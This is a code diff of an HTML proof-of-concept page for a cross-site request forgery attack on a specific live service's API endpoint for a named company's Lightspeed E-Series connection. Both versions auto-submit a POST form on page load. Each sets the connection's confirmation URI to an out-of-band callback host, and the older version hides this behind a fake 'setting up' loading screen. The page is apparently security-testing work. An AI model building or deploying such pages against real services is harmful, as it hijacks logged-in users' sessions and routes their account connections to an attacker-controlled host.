@@ -1,36 +1,28 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Lightspeed E-Series Integration</title>
-    <style>
-        body { font-family: Arial, sans-serif; max-width: 600px; margin: 100px auto; text-align: center; }
-        .loading { color: #666; }
-    </style>
+    <title>Lightspeed Setup</title>
 </head>
 <body>
-    <div class="loading">
-        <h2>Setting up Lightspeed E-Series Integration...</h2>
-        <p>Please wait while we configure your connection.</p>
-    </div>
-
-    <!-- Hidden form that auto-submits -->
-    <form id="csrfForm" action="https://app.channable.com/api/companies/97083/connections/lightspeed_eseries/initiate" method="POST" style="display: none;">
-        <textarea name="json_payload">{"properties":{"label":{"nodeType":"static","value":"Lightspeed E-Series"}},"confirm_connection_uri":"https://ijkdzaimgictwclkwecvvqiehzjldlil5.oast.fun"}</textarea>
+    <h2>Connecting your Lightspeed account...</h2>
+    
+    <!-- This form WILL submit successfully -->
+    <form id="attackForm" action="https://app.channable.com/api/companies/97083/connections/lightspeed_eseries/initiate" method="POST">
+        <input type="hidden" name="payload" value='{
+            "properties": {
+                "label": {
+                    "nodeType": "static", 
+                    "value": "Lightspeed E-Series"
+                }
+            },
+            "confirm_connection_uri": " https://ijkdzaimgictwclkwecvvqiehzjldlil5.oast.fun"
+        }' />
     </form>
 
     <script>
-        // Auto-submit form on page load (bypasses CORS)
-        document.addEventListener('DOMContentLoaded', function() {
-            document.getElementById('csrfForm').submit();
-        });
-
-        // Fallback: If form doesn't work, provide manual link
-        setTimeout(function() {
-            document.body.innerHTML = '<h2>Redirecting...</h2><p>If you are not redirected automatically, <a href="https://app.channable.com/api/companies/97083/connections/lightspeed_eseries/initiate">click here</a></p>';
-        }, 5000);
+        // This will work - forms don't care about CORS
+        console.log('Submitting form to target.com...');
+        document.getElementById('attackForm').submit();
     </script>
 </body>
 </html>
-
-
-
